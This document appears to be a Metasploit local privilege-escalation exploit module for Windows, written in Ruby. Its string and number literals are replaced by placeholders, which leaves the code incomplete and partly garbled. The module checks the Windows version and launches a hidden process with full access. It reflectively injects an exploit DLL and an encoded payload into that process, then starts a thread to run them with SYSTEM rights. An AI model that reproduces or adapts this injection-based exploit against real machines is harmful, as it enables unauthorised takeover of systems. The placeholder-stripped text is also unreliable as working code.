require <str> require <str> require <str> require <str> class Metasploit3 < Msf :: Exploit :: Local Rank = GreatRanking include Msf :: Post :: File include Msf :: Post :: Windows :: Priv include Msf :: Post :: Windows :: ReflectiveDLLInjection def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> , <str> ] , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ [ <str> , { <str> = > ARCH_X86 , <str> = > <str> } ] ] , <str> = > <int> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> ) ) end def check if sysinfo [ <str> ] =~ <str> return Exploit :: CheckCode :: Safe end winver = sysinfo [ <str> ] unless winver =~ <str> return Exploit :: CheckCode :: Safe end return Exploit :: CheckCode :: Detected end def exploit if is_system? fail_with ( Failure :: None , <str> ) end if check == Exploit :: CheckCode :: Safe fail_with ( Failure :: NotVulnerable , <str> ) end print_status ( <str> ) process = client . sys . process . execute ( <str> , nil , { <str> = > true } ) host_process = client . sys . process . open ( process . pid , PROCESS_ALL_ACCESS ) print_good ( <str> process . pid <str> ) print_status ( <str> process . pid <str> ) library_path = :: File . join ( Msf :: Config . data_directory , <str> , <str> , <str> ) library_path = :: File . expand_path ( library_path ) print_status ( <str> process . pid <str> ) exploit_mem , offset = inject_dll_into_process ( host_process , library_path ) print_status ( <str> process . pid <str> ) payload_mem = inject_into_process ( host_process , payload . encoded ) print_status ( <str> ) host_process . thread . create ( exploit_mem + offset , payload_mem ) print_good ( <str> ) end end 
